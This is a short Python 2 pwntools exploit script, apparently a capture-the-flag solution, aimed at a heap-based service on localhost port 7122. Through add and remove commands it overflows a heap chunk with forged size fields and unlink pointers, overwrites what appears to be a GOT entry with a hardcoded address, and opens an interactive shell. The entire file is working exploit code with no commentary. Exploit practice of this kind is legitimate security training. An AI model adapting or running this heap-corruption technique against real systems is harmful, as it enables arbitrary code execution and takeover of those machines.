#!/usr/bin/env python2

from pwn import *
from IPython import embed

context.arch = 'amd64'
p = remote('127.0.0.1', 7122)

def cmd(comd, idx, sz = 0, ct = 0):
	p.sendline(comd)
	sleep(0.2)
	p.sendline(str(idx))
	sleep(0.2)
	if 'add' in comd:
		p.sendline(str(sz))
		sleep(0.2)
		p.sendline(ct)
	sleep(0.2)



cmd('add', 0, 136, 'asdf')
cmd('remove', 0)

cmd('add', 0, 136, 'asdf')
cmd('add', 1, 136, 'qwer')
cmd('remove', 0)
cmd('add', 0, 136, ''.ljust(128, 'A') + flat(0x110, 0x90))
cmd('remove'.ljust(8) + flat(0x110, 0x6010d8-0x18, 0x6010d8-0x10), 1)

p.sendline(flat(0, 0, 0, 0x601048))
p.sendline('sh'.ljust(8, '\x00') + p64(0x40089d))

p.interactive()


